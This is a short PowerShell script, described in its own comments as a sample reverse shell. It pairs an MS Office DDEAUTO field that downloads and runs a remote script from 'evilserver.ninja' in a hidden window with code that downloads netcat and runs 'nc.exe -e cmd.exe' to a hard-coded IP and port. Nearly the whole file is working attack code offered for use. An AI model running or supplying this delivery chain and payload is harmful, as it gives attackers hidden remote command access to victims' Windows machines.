<#
Sample powershell script to establish reverse shell
To be used as a download via DDEAUTO MSOFFICE "feature" using
DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -sta -NonI -W Hidden $script=(New-Object System.Net.WebClient).DownloadString('http://evilserver.ninja/pp.ps1'); powershell $script"}

DDEAUTO test = {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
#>

#set variable
$url='https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip'
$source="$HOME\Downloads\nc.zip"
$dest="$HOME\Downloads\nc"
$exec="$HOME\Downloads\nc\netcat-1.11\nc.exe "
$param="-e cmd.exe 192.168.239.139 31337"

#download netcat
(New-Object System.Net.WebClient).DownloadFile($url, $source)

#add ability to unzip files, unzip netcat
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::ExtractToDirectory($source, $dest)

#exec netcat to start reverse shell

& $HOME\Downloads\nc\netcat-1.11\nc.exe -e cmd.exe 192.168.239.140 31337

<#scratch
write-output ($exec + $param)
$HOME\Downloads\nc\netcat-1.11\nc.exe -e cmd.exe 192.168.239.140 31337
#>